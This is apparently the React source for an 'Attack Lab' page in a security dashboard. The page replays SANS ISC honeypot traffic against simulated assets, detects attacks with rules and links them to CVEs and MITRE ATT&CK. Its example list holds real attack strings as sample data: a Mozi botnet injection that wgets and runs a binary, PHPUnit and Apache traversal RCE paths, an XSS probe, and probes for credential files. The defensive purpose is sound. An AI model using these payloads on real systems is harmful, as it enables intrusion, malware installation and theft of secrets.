import { useMemo, useState } from 'react'
import { Link } from 'react-router-dom'
import { notifyRefresh, post, useAssets, useData, useHealth, type Alert } from './api'
import AttackGraph, { type IntelCve } from './attack/AttackGraph'
import { Empty, PageHead, Panel } from './ui'
import { DetailFold } from './Visuals'

// Attack Lab on REAL data: real attackers' real requests and connection attempts (SANS Internet Storm Center
// honeypots and firewall sensors) are replayed against one of our simulated assets, detected from the log text alone,
// linked to our threat intel (CVE -> KEV/EPSS -> our asset inventory) and turned into a scored incident.

type Attacker = {
  ip: string; kind: 'web' | 'login' | 'scan'; headline: string; attack_types: string[]; rules: string[]; cve_ids: string[]
  web_requests: number; firewall_records: number; first_seen: string | null; last_seen: string | null; country: string | null
  as_name: string | null; threat_feeds: string[]; user_agents: string[]; detected: boolean; default_target: string
}
type Catalogue = { source: string; retrieved_at: string | null; note: string | null; web_requests: number; firewall_records: number; items: Attacker[] }
type Match = { start: number; end: number; text: string; technique: string; signature: string; family?: string }
type Line = { line_no: number; raw: string; source: string; flagged_by: string | null; decoded: string | null; matches: Match[] }
type Mitre = { id: string; name: string; tactic: string; url: string }
type Detection = {
  rule_id: string; name: string; label: string; stage: string; confidence: string; src_ip: string | null;
  count: number; reason: string; techniques: string[]; mitre: Mitre[]; evidence: { line_no: number }[]
}
type Check = { rule_id: string; fired: boolean; observed: string; threshold: string }
type Verdict = {
  attack_detected: boolean; headline: string; attack_types: string[]; stage: string | null; confidence: string | null;
  mitre: Mitre[]; attacker_ips: string[]; decision_path: string[]
}
type Analysis = { lines: Line[]; detections: Detection[]; checks: Check[]; verdict: Verdict; parsed: Record<string, number> }
type Step = { title: string; detail: string; actor: string; line_nos: number[] }
type Location = { country?: string; country_code?: string; city?: string; asn?: number; asn_org?: string; geo_source?: string }
type Reputation = { as_name?: string; country?: string; isc_reports?: number | null; isc_targets?: number | null; threat_feeds: string[] }
type RunResult = Analysis & {
  run_id: string; kind: string; data_classification: string; steps: Step[]; replayed: number; total_records: number
  attacker: Attacker; target: { asset_id: string; hostname: string; role: string }
  intel: { cves: IntelCve[]; attacker: { ip: string; reputation: Reputation | null; location: Location | null; our_ioc_hits: { source: string; type: string; malware_family: string | null }[] } }
  correlation: { created: string[]; note: string; incidents: Alert[]; vulnerability_alerts: string[] }
}
type RuleBook = { rules: Rule[]; thresholds?: Record<string, number & number[]> }
type Rule = { rule_id: string; name: string; log_source: string; kind: string; logic: string; why_it_works: string; mitre: Mitre[] }

const STAGE_TONE: Record<string, string> = { Reconnaissance: 'medium', 'Attack attempt': 'high', 'Compromise likely': 'critical' }
const KINDS: { id: string; label: string; test: (a: Attacker) => boolean }[] = [
  { id: 'all', label: 'All', test: () => true },
  { id: 'exploit', label: 'Known-CVE signatures', test: (a) => a.rules.includes('WEB-EXPLOIT-001') },
  { id: 'inject', label: 'Injection / traversal', test: (a) => a.rules.some((r) => /CMDI|SQLI|TRAV|XSS/.test(r)) },
  { id: 'login', label: 'Login hammering', test: (a) => a.kind === 'login' },
  { id: 'scan', label: 'Port scans', test: (a) => a.kind === 'scan' },
  { id: 'recon', label: 'Secrets scanning', test: (a) => a.rules.includes('WEB-RECON-001') },
  { id: 'quiet', label: 'No rule fired', test: (a) => !a.detected },
]
// Real requests captured by SANS ISC honeypots (28-30 Oct 2026), for the paste box.
const EXAMPLES: Record<string, string> = {
  'Mozi botnet injection': '/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron',
  'PHPUnit RCE (CVE-2017-9841)': '/lib/phpunit/Util/PHP/eval-stdin.php\n/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
  'Apache traversal (CVE-2021-41773)': '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh',
  'XSS probe': "/?key='>\"<svg/onload=confirm('xss')>",
  'Secrets hunting': '/.env\n/.git/config\n/phpinfo.php\n/wp-config.php.bak\n/.aws/credentials',
}

function Highlighted({ text, matches }: { text: string; matches: Match[] }) {
  const parts: React.ReactNode[] = []
  let at = 0
  for (const m of [...matches].filter((m) => m.end > m.start).sort((a, b) => a.start - b.start)) {
    if (m.start < at) continue
    parts.push(text.slice(at, m.start), <mark key={m.start} className="lab-mark" title={m.technique}>{text.slice(m.start, m.end)}</mark>)
    at = m.end
  }
  parts.push(text.slice(at))
  return <>{parts}</>
}

function LogLine({ line }: { line: Line }) {
  return (
    <li className={`lab-line ${line.flagged_by ? 'is-hit' : ''}`}>
      <span className="lab-no">{line.line_no}</span>
      <span className="min-w-0">
        <span className="block break-all">{line.raw}</span>
        {line.matches.some((m) => m.end > m.start) && line.decoded && (
          <span className="mt-1 block break-all text-grey-200">decoded: <Highlighted text={line.decoded} matches={line.matches} /></span>
        )}
      </span>
      {line.flagged_by && <span className="lab-rule">{line.flagged_by}</span>}
    </li>
  )
}

function MitreChips({ items }: { items: Mitre[] }) {
  return <span className="flex flex-wrap gap-1.5">{items.map((m) =>
    <a key={m.id} className="tag hover:underline" href={m.url} target="_blank" rel="noreferrer" title={`${m.tactic}: ${m.name}`}>{m.id} {m.name}</a>)}</span>
}

function Detections({ result }: { result: Analysis }) {
  const quiet = result.checks.filter((c) => !c.fired)
  return <>
    <Panel title={`How we detected it · ${result.detections.length} rule(s) fired`}>
      {!result.detections.length ? <Empty>No rule fired. Nothing here looks like an attack.</Empty> :
        <ol className="divide-y divide-rule">{result.detections.map((d, i) => (
          <li key={i} className="grid gap-2 p-4">
            <div className="flex flex-wrap items-center gap-2">
              <span className="lab-rule">{d.rule_id}</span><b className="text-white">{d.label}</b>
              <span className="tag">confidence {d.confidence}</span><span className="tag">{d.stage}</span>
            </div>
            <p>{d.reason}</p>
            {d.techniques.length > 0 && <ul className="list-disc pl-5 text-grey-200">{d.techniques.map((t) => <li key={t}>{t}</li>)}</ul>}
            <MitreChips items={d.mitre} />
            <p className="text-sm text-grey-400">Evidence: line {d.evidence.map((e) => e.line_no).join(', ')}{d.count > d.evidence.length ? ` (+${d.count - d.evidence.length} more)` : ''}</p>
          </li>))}
        </ol>}
    </Panel>
    {quiet.length > 0 && <details className="panel mt-4">
      <summary className="panel-title cursor-pointer">Rules checked that did not fire ({quiet.length})</summary>
      <table className="dash-table"><thead><tr><th>Rule</th><th>What it saw</th><th>Needs</th></tr></thead>
        <tbody>{quiet.map((c) => <tr key={c.rule_id}><td className="whitespace-nowrap">{c.rule_id}</td><td>{c.observed}</td><td>{c.threshold}</td></tr>)}</tbody></table>
    </details>}
  </>
}

function VerdictPanel({ v }: { v: Verdict }) {
  const tone = v.stage ? STAGE_TONE[v.stage] : 'low'
  return (
    <section className={`panel lab-verdict tone-${tone}`}>
      <div className="grid gap-3 p-4">
        <p className="text-sm tracking-wide text-grey-300 uppercase">Verdict: what kind of attack is this?</p>
        <h2 className="font-display text-2xl font-light text-white">{v.headline}</h2>
        {v.attack_detected && <div className="flex flex-wrap items-center gap-2">
          <span className={`badge badge-${tone}`}>{v.stage}</span><span className="tag">confidence {v.confidence}</span>
        </div>}
        {v.mitre.length > 0 && <MitreChips items={v.mitre} />}
        <details><summary className="cursor-pointer text-blue-300">Decision path</summary>
          <ol className="mt-2 list-decimal space-y-1 pl-5">{v.decision_path.map((p, i) => <li key={i}>{p}</li>)}</ol></details>
      </div>
    </section>
  )
}

const MATCH_LABEL: Record<string, string> = { confirmed_affected: 'VULNERABLE', needs_verification: 'Possibly vulnerable', confirmed_unaffected: 'Not vulnerable' }

// The link to our threat intelligence: who the attacker is, and what our feeds + matcher say about each exploited CVE.
function IntelPanel({ run }: { run: RunResult }) {
  const a = run.intel.attacker
  const rep = a.reputation
  const loc = a.location
  return (
    <section className="panel lab-intel mt-4">
      <h2 className="panel-title">Threat intel on this attack · from our feeds, not from the replay</h2>
      <div className="grid gap-4 p-4 lg:grid-cols-[minmax(0,1fr)_minmax(0,1.6fr)]">
        <div className="grid content-start gap-2">
          <p className="ag-kicker">Attacker</p>
          <p className="font-mono text-lg text-white">{a.ip}</p>
          <p>{[loc?.city, loc?.country ?? loc?.country_code].filter(Boolean).join(', ') || 'Location unknown'}{loc?.asn_org ? ` · ${loc.asn_org}` : ''}{loc?.asn ? ` (AS${loc.asn})` : ''}</p>
          {rep?.isc_reports != null && <p className="text-sm">SANS ISC: {rep.isc_reports.toLocaleString('en-IN')} reports against {rep.isc_targets?.toLocaleString('en-IN') ?? '?'} targets</p>}
          <div className="flex flex-wrap gap-1.5">
            {rep?.threat_feeds.length ? rep.threat_feeds.map((f) => <span key={f} className="tag tag-attacker">{f}</span>)
              : <span className="text-sm text-grey-400">Not listed in ISC's threat feeds</span>}
          </div>
          <p className="text-sm">{a.our_ioc_hits.length
            ? <>In our IOC feeds: {a.our_ioc_hits.map((h) => `${h.source}${h.malware_family ? ` (${h.malware_family})` : ''}`).join(', ')}</>
            : <span className="text-grey-400">Not in our abuse.ch / OTX / IP-reputation indicators</span>}</p>
          <p className="text-xs text-grey-500">Location = where the network is registered, not the person behind it.</p>
        </div>
        <div>
          <p className="ag-kicker">Exploited CVEs → our feed → our asset {run.target.asset_id}</p>
          {!run.intel.cves.length ? <p className="mt-2 text-grey-300">No request named a specific CVE. Detection relied on behaviour (signatures, thresholds).</p> :
            <table className="dash-table mt-1"><thead><tr><th>CVE</th><th>KEV</th><th>EPSS</th><th>CVSS</th><th>{run.target.asset_id}</th><th>Other assets</th></tr></thead>
              <tbody>{run.intel.cves.map((c) => (
                <tr key={c.cve_id}>
                  <td><Link className="text-blue-300 underline" to={`/app/threats?search=${c.cve_id}`}>{c.cve_id}</Link><span className="block text-xs text-grey-400">{c.title?.replace(`${c.cve_id}: `, '') ?? 'not in our feed'}</span></td>
                  <td>{c.kev_listed ? <span className="badge badge-critical">Exploited</span> : c.kev_listed === false ? 'No' : '—'}</td>
                  <td>{c.epss != null ? `${(c.epss * 100).toFixed(1)}%` : '—'}</td>
                  <td>{c.cvss ?? '—'}</td>
                  <td title={c.target_reason}><span className={`tag ${c.target_match === 'confirmed_affected' ? 'tag-attacker' : ''}`}>{MATCH_LABEL[c.target_match ?? ''] ?? '—'}</span></td>
                  <td className="text-sm">{c.other_exposed_assets?.length ? c.other_exposed_assets.join(', ') : 'none'}</td>
                </tr>))}</tbody></table>}
        </div>
      </div>
    </section>
  )
}

export default function AttackLab() {
  const health = useHealth()
  const assets = useAssets()
  const cat = useData<Catalogue>('/api/attack-lab/attackers', { source: '', retrieved_at: null, note: null, web_requests: 0, firewall_records: 0, items: [] }, (j) => j as Catalogue)
  const rules = useData<RuleBook>('/api/attack-lab/rules', { rules: [] }, (j) => j as RuleBook)
  const [filter, setFilter] = useState('all')
  const [pick, setPick] = useState<string | null>(null)
  const [target, setTarget] = useState('')
  const [state, setState] = useState<{ busy?: boolean; result?: RunResult; error?: string }>({})
  const [text, setText] = useState(EXAMPLES['Mozi botnet injection'])
  const [mine, setMine] = useState<{ busy?: boolean; result?: Analysis; error?: string }>({})

  const shown = useMemo(() => cat.data.items.filter(KINDS.find((k) => k.id === filter)!.test), [cat.data.items, filter])
  const chosen = cat.data.items.find((a) => a.ip === pick) ?? shown[0]
  const enabled = health.mode === 'live' && health.data.demo_mode
  const result = state.result

  const run = async () => {
    if (!chosen) return
    setState({ busy: true })
    try {
      const r = await post('/api/attack-lab/run', { attacker_ip: chosen.ip, target_asset_id: target || null }) as RunResult
      setState({ result: r })
      notifyRefresh()
    } catch (e) { setState({ error: e instanceof Error ? e.message : 'Replay failed' }) }
  }
  const reset = async () => {
    try { await post('/api/demo/reset-alerts'); setState({}); notifyRefresh() }
    catch (e) { setState({ error: e instanceof Error ? e.message : 'Reset failed' }) }
  }
  const analyze = async () => {
    setMine({ busy: true })
    try { setMine({ result: await post('/api/attack-lab/analyze', { lines: text.split('\n').filter((l) => l.trim()) }) as Analysis }) }
    catch (e) { setMine({ error: e instanceof Error ? e.message : 'Analysis failed' }) }
  }

  return <>
    <PageHead title="Attack simulation" />
    <div className="intel-path"><div><strong>Captured traffic</strong><small>Historical SANS ISC observations</small></div><div><strong>Deterministic analysis</strong><small>Signatures, thresholds and source evidence</small></div><div><strong>Asset-aware incident</strong><small>Match known CVEs to reported software</small></div></div>
    <DetailFold title="What this replay demonstrates"><p>Historical requests from SANS Internet Storm Center sensors are replayed against simulated targets. Signature matches support attempted-exploitation analysis, not proof of a successful compromise. Actual request-driven lab testing uses the separate owned live console.</p></DetailFold>

    <Panel title={`1 · Choose a real attacker · ${cat.data.items.length} from ${cat.data.web_requests.toLocaleString('en-IN')} web requests and ${cat.data.firewall_records.toLocaleString('en-IN')} firewall records`}>
      <div className="flex flex-wrap gap-2 px-4 pt-4">
        {KINDS.map((k) => {
          const n = cat.data.items.filter(k.test).length
          return n || k.id === 'all' ? <button key={k.id} type="button" className={`tag ${filter === k.id ? 'tag-attacker' : ''}`} onClick={() => { setFilter(k.id); setPick(null); setTarget('') }}>{k.label} ({n})</button> : null
        })}
      </div>
      <div className="grid gap-3 p-4 sm:grid-cols-2 xl:grid-cols-4">
        {shown.map((a) => (
          <button key={a.ip} type="button" aria-pressed={a.ip === chosen?.ip}
            className={`lab-card ${a.ip === chosen?.ip ? 'is-on' : ''}`} onClick={() => { setPick(a.ip); setTarget('') }}>
            <span className="flex items-baseline justify-between gap-2"><b className="font-mono text-white">{a.ip}</b><span className="text-xs">{a.country ?? '??'}</span></span>
            <span className="text-sm text-white">{a.detected ? a.attack_types.join(' + ') : 'No rule fired (control)'}</span>
            <span className="text-xs">{a.as_name ?? 'network unknown'} · {a.web_requests ? `${a.web_requests} web requests` : ''}{a.web_requests && a.firewall_records ? ' · ' : ''}{a.firewall_records ? `${a.firewall_records} firewall records` : ''}</span>
            <span className="mt-auto flex flex-wrap gap-1">
              {a.cve_ids.map((c) => <span key={c} className="tag tag-attacker">{c}</span>)}
              {a.threat_feeds.length > 0 && <span className="tag">in {a.threat_feeds.length} threat feed{a.threat_feeds.length > 1 ? 's' : ''}</span>}
              <span className="tag">{a.first_seen}{a.last_seen && a.last_seen !== a.first_seen ? ` → ${a.last_seen}` : ''}</span>
            </span>
          </button>
        ))}
        {!cat.data.items.length && <Empty>Real attacker data needs the backend (backend/data/cache/isc.json).</Empty>}
      </div>
      <div className="flex flex-wrap items-center gap-3 border-t border-rule p-4">
        <label className="flex items-center gap-2">Replay against
          <select className="dash-select" value={target || chosen?.default_target || ''} onChange={(e) => setTarget(e.target.value)}>
            {assets.data.map((a) => <option key={a.asset_id} value={a.asset_id}>{a.asset_id} · {a.hostname} · {a.role}</option>)}
          </select>
        </label>
        <button type="button" className="btn-line" disabled={!enabled || state.busy || !chosen} onClick={run}>{state.busy ? 'Replaying' : 'Replay attack'}</button>
        <button type="button" className="btn-line" disabled={!enabled || state.busy} onClick={reset}>Reset demo alerts</button>
        <p className="w-full text-sm text-grey-400">Source: {cat.data.source || 'SANS ISC'}{cat.data.retrieved_at ? ` · fetched ${new Date(cat.data.retrieved_at).toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' })}` : ''}. Default targets use the signature-associated CVE match when available.</p>
        {!enabled && <p className="w-full text-grey-300">Replaying needs the backend in demo mode. The rulebook and log analyzer below still work when connected.</p>}
        {state.error && <p role="status" className="w-full text-sev-high">{state.error}</p>}
      </div>
    </Panel>

    {result && <>
      <div className="mt-4"><AttackGraph key={result.run_id} run={result} thresholds={rules.data.thresholds ?? {}} /></div>
      <IntelPanel run={result} />
      <details className="mt-4">
        <summary className="cursor-pointer text-blue-300">Rule-by-rule details</summary>
        <div className="mt-2"><Detections result={result} /></div>
      </details>
      <p className="mt-2 text-sm text-grey-400">{result.data_classification} · replayed {result.replayed} of {result.total_records} real records · run {result.run_id}</p>
    </>}

    <Panel title="Try it yourself: paste log lines or a request" className="mt-6">
      <div className="grid gap-3 p-4">
        <div className="flex flex-wrap items-center gap-2"><span className="text-sm text-grey-400">Real honeypot requests:</span>{Object.keys(EXAMPLES).map((k) =>
          <button key={k} type="button" className="tag" onClick={() => { setText(EXAMPLES[k]); setMine({}) }}>{k}</button>)}</div>
        <textarea className="dash-select min-h-32 font-mono text-sm" value={text} onChange={(e) => setText(e.target.value)}
          aria-label="Log lines to analyse" spellCheck={false} />
        <div><button type="button" className="btn-line" disabled={mine.busy || health.mode !== 'live'} onClick={analyze}>Analyse</button></div>
        <p className="text-sm text-grey-400">Accepts web access-log lines, sshd auth lines, firewall lines, or just a URL / form value. Nothing is stored.</p>
        {mine.error && <p role="status" className="text-sev-high">{mine.error}</p>}
      </div>
      {mine.result && <div className="grid gap-4 border-t border-rule p-4 xl:grid-cols-2">
        <div className="grid content-start gap-4">
          <VerdictPanel v={mine.result.verdict} />
          <ul className="lab-log">{mine.result.lines.map((l) => <LogLine key={l.line_no} line={l} />)}</ul>
        </div>
        <div><Detections result={mine.result} /></div>
      </div>}
    </Panel>

    <Panel title="Detection rulebook: exactly how each attack type is recognised" className="mt-6">
      <div className="p-4 flex flex-wrap gap-2"><span className="tag">{rules.data.rules.length} rule definitions</span>{[...new Set(rules.data.rules.map(r=>r.log_source))].map(s=><span className="tag" key={s}>{s}</span>)}</div>
      <DetailFold title="Open thresholds, rule logic and MITRE ATT&CK mappings"><div className="overflow-auto"><table className="dash-table">
        <thead><tr><th>Rule</th><th>Detects</th><th>Reads</th><th>Logic</th><th>Why it works</th><th>MITRE ATT&CK</th></tr></thead>
        <tbody>{rules.data.rules.map((r) => <tr key={r.rule_id}>
          <td className="whitespace-nowrap"><span className="lab-rule">{r.rule_id}</span></td>
          <td className="text-white">{r.name}<span className="block text-xs text-grey-400">{r.kind}</span></td>
          <td>{r.log_source}</td><td className="min-w-72">{r.logic}</td><td className="min-w-60 text-grey-200">{r.why_it_works}</td>
          <td><MitreChips items={r.mitre} /></td>
        </tr>)}</tbody>
      </table></div></DetailFold>
    </Panel>
  </>
}
